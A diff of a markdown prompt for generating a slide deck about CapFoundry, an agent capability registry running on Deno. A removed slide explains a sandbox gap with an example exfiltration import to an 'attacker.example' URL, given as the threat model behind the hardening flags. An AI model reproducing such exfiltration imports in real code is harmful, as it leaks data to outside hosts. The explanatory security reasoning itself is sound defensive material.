@@ -1,25 +1,26 @@
 # Prompt for Claude Design — CapFoundry feature deck
 
-Paste everything below the line into Claude Design. It is self-contained: every number and name in
-it is taken from the repository, so nothing needs inventing.
+Paste everything below the line into Claude Design. It is self-contained: every capability name,
+command and example in it is taken from the working repository, so nothing needs inventing.
 
 ---
 
-Build me a slide deck about **CapFoundry**, an experimental capability registry for AI agents. English
-throughout. Around 16 artboards, 16:9.
+Build me a slide deck about **CapFoundry**, a capability registry for AI agents. English throughout.
+Around 16 artboards, 16:9.
 
-**Audience:** software developers and engineering leads evaluating how to bring AI into their
-development lifecycle. Technical, sceptical, allergic to product-launch language. They will judge the
-deck on whether it tells them something they did not already know.
+**Purpose of the deck:** show what CapFoundry can do, how you use it, and why it was built. Someone
+should finish it knowing what they would type and what they would get back.
 
-**Tone:** plain and confident. No superlatives, no "revolutionary", no rocket emoji. This is an
-experiment that is allowed to fail, and the deck should sound like an engineer explaining a design
-rather than a company announcing a product. Where something is unproven, say so on the slide.
+**Audience:** software developers and engineering leads bringing AI into their development workflow.
+Technical. They want to see the thing work, not hear it described.
 
-**Visual direction:** restrained and technical. A single accent colour, otherwise near-monochrome.
-Real monospace for anything that is code, a JSON key or a capability name. Generous whitespace; one
-idea per slide. Diagrams as clean line work, not as clip-art. Dark and light both fine — pick one and
-commit. Avoid stock imagery, gradients and glow.
+**Tone:** plain and confident. No superlatives, no "revolutionary", no rocket emoji. Let the examples
+do the persuading — every command in this deck is real and produces the output shown.
+
+**Visual direction:** restrained and technical. One accent colour, otherwise near-monochrome. Real
+monospace for every command, JSON key and capability name — the code is the content, so give it room.
+Generous whitespace, one idea per slide. Diagrams as clean line work. Dark or light, pick one and
+commit. No stock imagery, gradients or glow.
 
 ---
 
@@ -27,109 +28,133 @@ commit. Avoid stock imagery, gradients and glow.
 
 ### 1. Title
 **CapFoundry** — "Don't generate what you already know."
-Subtitle: an experimental capability registry for AI agents. Experiment, not a product.
+Subtitle: a capability registry your AI agent searches before it writes code.
 
-### 2. The problem
+### 2. Why it exists
 Models reinvent the wheel. The same haversine formula, the same CSV delimiter sniffer, the same slug
 function, written fresh in every session, with no memory that any of it was ever solved. Each version
-is correct-ish, slightly different, and has to be reviewed again.
+is correct, slightly different, and has to be read by someone.
 **The line to land:** the problem isn't that AI writes bad code — it's that it writes good code
 cheaply enough that nothing ever accumulates.
 
 ### 3. The idea
-Before an agent solves a task, it asks its local manager (CFCM): *do we already have this?*
-Three answers, all normal: `MATCH`, `PARTIAL_MATCH`, `NO_MATCH`.
-Shorthand for the architecture: **centralize knowledge, decentralize execution.**
+Before an agent solves a task, it asks its local manager (**CFCM**): *do we already have this?*
+If yes, it runs a sealed, tested implementation. If no, it writes the code as usual — and can offer
+what it wrote back to the registry.
+Shorthand: **centralize knowledge, decentralize execution.**
 
-### 4. `NO_MATCH` is a feature
-A registry embarrassed to say it has nothing starts returning things that nearly fit — and a
-near-miss is worse than no answer, because the agent uses it. Search returns *why* it matched
-(`matchedOn`), not just a score, so a caller can reject on evidence.
+### 4. The flow — diagram
+`agent question → search → resolve artifact → verify sha256 → sandboxed execution → result`
+with a branch from "no match" to `write it normally → offer as a candidate`.
+Everything runs on the developer's own machine. No central execution service.
 
-### 5. The flow — diagram
-`agent question → lexical search → resolve artifact → verify sha256 → sandboxed execution → result`
-with a branch off "no match" going to `generate normally → maybe submit as candidate`.
+### 5. What you get back
+Real search output, monospace:
+```
+$ cfcm search "coordinates for an address"
+MATCH  confidence 0.867  (5.5 ms)
+  CapFoundry.geo.geocode  1.0.0  [public]
+    Resolve an address or place name to coordinates
+    matched on: aliases · description · exampleQueries · summaries · tags
+```
+The point of the slide: it tells you **why** it matched, not just how confident it is.
 
-### 6. Contracts
+### 6. Calling one
+```
+$ cfcm invoke CapFoundry.geo.geocode Aarhus
+{ "resolved": true, "status": "ok",
+  "match": { "displayName": "Aarhus, Aarhus Kommune, 8000, Danmark",
+             "lat": 56.1496278, "lon": 10.2134046, "countryCode": "DK" },
+  "attribution": "Data © OpenStreetMap contributors, ODbL 1.0." }
+```
+You rarely write JSON: arguments come from the capability's own `inputSchema`. A positional fills the
+next required field, `--name value` a named one, `--a.b value` a nested one.
+
+### 7. They compose
+Results go to stdout and diagnostics to stderr, so capabilities pipe together:
+```
+cfcm invoke CapFoundry.geo.geocode Aarhus   →  lat/lon
+        ↓
+cfcm invoke CapFoundry.geo.distance         →  289.4 km to Hamburg
+```
+Two capabilities, neither of which knew the other existed, composed by a caller who read two
+contracts.
+
+### 8. The ten capabilities
+A clean table — name, effect, one line each:
+`csv.detectDelimiter` PURE — infer which character separates CSV fields, with its evidence
+`date.businessDaysBetween` PURE — working days between two dates
+`geo.distance` PURE — great-circle distance between two coordinates
+`geo.geocode` **NETWORK** — address or place name to coordinates
+`json.schema.infer` PURE — JSON Schema from an example document
+`sun.times` PURE — sunrise, sunset, twilight, golden hour
+`text.editDistance` PURE — Levenshtein distance and similarity
+`text.slugify` PURE — text to a URL-safe slug
+`ui.dataTable` PURE — a framework-free sortable table as a custom element
+`validation.iban` PURE — IBAN validation to ISO 13616
+
+### 9. Two ways to get an answer
+`return: "result"` runs it and hands you the answer.
+`return: "artifact"` hands you the **source**, to put in your own project and ship.
+One registry serves both "answer my question" and "give me the code", and each capability decides
+which it allows.
+
+### 10. Contracts, not documentation
 Every capability ships a `capability.json`: `inputSchema`, `outputSchema`, `effect`, `exposure`,
-`permissions`, a sealed `sha256`, tests, licence and provenance. Show a trimmed real example.
+`permissions`, a sealed `sha256`, plus tests, licence and provenance. Show a trimmed real example.
+A capability is a package you can verify, not a snippet you have to trust.
 
-### 7. Effects are enforced, not promised
-`PURE` runs in a Deno subprocess with **no `--allow-* flag at all`**. The descriptor is not trusted;
-the runtime enforces it.
-**The uncomfortable detail that makes the slide:** zero permissions is not a sandbox. Deno does not
-gate module loading on `--allow-net`, so a static `import "https://attacker.example/?data=…"` is
-fetched before any permission check runs — exfiltration with nothing granted. Closed with
-`--no-remote`, `--no-npm`, `--no-config`, `--no-lock`, `--node-modules-dir=none` and `clearEnv`.
-The flag list is the threat model, not tidiness.
+### 11. Effects the runtime enforces
+`PURE` means no network, no filesystem, no clock, no randomness — and it is **enforced, not
+promised**: the artifact runs in its own subprocess with no permission flags, plus `--no-remote` and
+`--no-npm` so nothing can be loaded from outside. A capability cannot quietly reach the network
+because the runtime never gives it the chance.
 
-### 8. `NETWORK` is an intersection
-A capability *declares* `permissions.network: ["nominatim.openstreetmap.org"]`. That is a request,
-not a grant. CFCM intersects it with local policy in `cfcm.json`, off by default.
-Verified four ways: granted that host → works. Granted nothing → refused. Granted `example.com` →
-**still refused**. Per-host, not a boolean.
+### 12. Network access is granted, never taken
+`geo.geocode` *declares* what it needs:
+```json
+"effect": "NETWORK",
+"permissions": { "network": ["nominatim.openstreetmap.org"] }
+```
+That is a request. CFCM intersects it with your own policy in `cfcm.json`, off by default — so it
+reaches exactly one host, only if you allow it, and no other.
 
-### 9. One search space, three namespaces
-`CapFoundry.*` public · `Netsi.*` private, registered locally so no central service knows the
-organisation exists · `Local.*` machine-only. All searched together; only the policies differ.
+### 13. It refuses rather than guesses
+`cfcm invoke CapFoundry.geo.geocode Viborg` returns `status: "ambiguous"` with candidates in
+**Denmark, the United States and Russia** — and no answer. Add `--countryCode DK` and it resolves.
+Silently picking the first would compute correctly against the wrong place and return something
+entirely credible. A registry that is embarrassed to say "I'm not sure" is worse than one that says
+nothing.
 
-### 10. Two ways to get an answer
-`return: "result"` runs it and gives you the answer. `return: "artifact"` gives you the source to put
-in your own project. `exposure` gates each independently — the private fixture executes but refuses
-to hand back its source (`EXPOSURE_DENIED`).
+### 14. Your capabilities, your machine
+Three namespaces, one search:
+`CapFoundry.*` public · `Netsi.*` private, registered in your own `cfcm.json` so no central service
+knows your organisation exists · `Local.*` machine-only, for trying something before publishing it.
+A private capability can execute while refusing to hand back its source.
 
-### 11. The ten capabilities
-A clean table: name, effect, one line each.
-`csv.detectDelimiter` PURE · `date.businessDaysBetween` PURE · `geo.distance` PURE ·
-`geo.geocode` **NETWORK** · `json.schema.infer` PURE · `sun.times` PURE · `text.editDistance` PURE ·
-`text.slugify` PURE · `ui.dataTable` PURE · `validation.iban` PURE.
-Note under the table: `sun.times` is a BSD-2-Clause port of SunCalc with licence and provenance
-retained; `text.editDistance` arrived through the candidate loop rather than being designed.
+### 15. The registry grows from use
+When an agent writes something deterministic and generally useful that the registry lacked, it can
+offer it as a candidate. Nothing is published automatically — a person reviews and promotes it.
+`CapFoundry.text.editDistance` joined the registry exactly this way: someone asked, there was no
+match, the agent wrote it and offered it.
+Alongside that, a local **Explore** page shows what is used most and what is repeatedly asked for and
+missing — which is a list of what to build next.
 
-### 12. Refuse rather than guess — `geo.geocode`
-Asking for "Viborg" returns `status: "ambiguous"` and **no match at all**, with candidates in
-Denmark, the United States and Russia. Pass `countryCode: "DK"` and it resolves.
-Silently taking the first hit would compute correctly against the wrong place and return something
-entirely credible. That is the worst failure a registry can distribute: wrong, plausible, reused.
-
-### 13. The loop closes
-An agent that writes something deterministic and generally useful can submit it as a candidate.
-Nothing is published; a person promotes it. `CapFoundry.text.editDistance` entered the registry
-exactly this way.
-
-### 14. From a shell
-`cfcm search`, `cfcm invoke`, `cfcm describe`, `cfcm list`. Arguments come from the capability's own
-`inputSchema`, so you rarely write JSON. Results on stdout, diagnostics on stderr, so capabilities
-compose:
-`cfcm invoke CapFoundry.geo.geocode Aarhus` piped into `geo.distance` gives 289.4 km to Hamburg —
-two capabilities neither of which knew about the other.
-Exit `2` means "no confident match", deliberately not `1`: a search that finds nothing is a normal
-answer.
-
-### 15. Telemetry and Explore
-Local by default, uploads off, and the search query is **opt-in** and stripped at the upload
-boundary. A static Explore page shows most used, most searched, fastest growing, new candidates,
-recently added — and **Missing**, the repeated questions with no answer, which is the only section
-that says what to build rather than what already happened.
-
-### 16. It is allowed to fail
-Seven falsification conditions were written down before the first line of code. Current state, shown
-honestly:
-- OBJ-1 hit rate **0.947** (18/19), threshold ≥ 0.80 — *provisional*
-- OBJ-2 wrong-match **0.000** (0/14), ceiling ≤ 0.05 — *provisional*
-- OBJ-3 overhead **24.9 ms** p95 on an M-series Mac, budget ≤ 250 ms
-- Three conditions **not yet measured**, one out of scope for the MVP's time horizon
-The two provisional ones are marked so because the test queries were written by the same person who
-wrote the capabilities' aliases — that measures internal consistency, not independent recall. And one
-number already published as 0.000 turned out to be 0.105 and was corrected in public.
-**Closing line:** the verdict — continue, pivot, or falsify — gets published whichever way it lands.
+### 16. Try it
+```
+git clone https://github.com/netsi1964/CapFoundry
+deno task cfcm search "distance between two coordinates"
+deno task cfcm invoke CapFoundry.text.slugify "Rødgrød med fløde"
+```
+Apache-2.0. Runs on Deno. Works as an MCP server for coding agents and as a CLI for people.
+Ten capabilities, 397 tests.
 
 ---
 
 ## Rules for the whole deck
 
-- Every number above is real. Do not round them, invent new ones, or add metrics that are not here.
-- Where something is unproven, the slide says so. Do not upgrade "provisional" to a tick.
-- Prefer one sentence a reader remembers over three they skim.
-- Code and JSON in monospace, syntax-correct, trimmed to what the slide needs.
+- Every command, name and number above is real. Do not invent capabilities, flags or metrics.
+- Show output wherever there is output to show. This deck persuades by demonstration.
+- Code and JSON in monospace and syntax-correct, trimmed to what the slide needs.
+- One sentence a reader remembers beats three they skim.
 - No slide should need a presenter to make sense.
